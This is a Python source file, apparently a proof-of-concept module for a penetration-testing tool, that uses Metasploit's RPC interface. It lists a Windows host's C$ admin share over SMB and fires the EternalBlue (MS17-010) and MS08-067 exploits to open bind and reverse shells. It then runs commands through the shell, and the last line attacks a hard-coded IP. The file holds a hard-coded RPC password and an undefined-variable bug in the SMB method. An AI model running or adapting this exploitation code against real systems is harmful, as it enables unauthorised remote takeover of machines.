import subprocess
import smbclient
import re
from pymetasploit3.msfrpc import MsfRpcClient
class poc_module:
    def __init__(self,ipaddress):
        self.ip = ipaddress
    def smb_account_poc(self,username,password,domain):
        try:
            smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
            exploit_folder = smb.listdir('/')
            return exploit_folder
        except:
            exploit_folder = "NULL"
            return exploit_folder
    def ms17010_poc(self):
        client = MsfRpcClient('1qaz@WSX',ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS']  = str(self.ip)
        print(self.ip)
        exploit.execute(payload="windows/x64/shell/bind_tcp")
        # print(client.sessions.list)
        # print(result)
        if bool(client.sessions.list):
            print(client.sessions.list)
            session_number = list(client.sessions.list.keys())[0]
            print(session_number)
            shell = client.sessions.session(session_number)
            shell.write('dir')
            result = shell.read()
            
            final_result = "\n".join(result.splitlines()[4:10])
            
            return final_result
        else:
            print("null")
            return "NULL"
    def ms08067_poc(self):
        client = MsfRpcClient('1qaz@WSX',ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
        exploit['RHOSTS']  = self.ip
        exploit.execute(payload='windows/meterpreter/reverse_tcp')

        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            shell = client.sessions.session(session_number)
            print(session_number)
            shell.write('dir')
            result = shell.read()
            result = "\n".join(result.splitlines()[4:10])
            # shell.stop()
        else:
            result ="NULL"
        return result

# data = {"prove":""}
print(poc_module("10.10.234.174").ms17010_poc())
# print(data['prove'])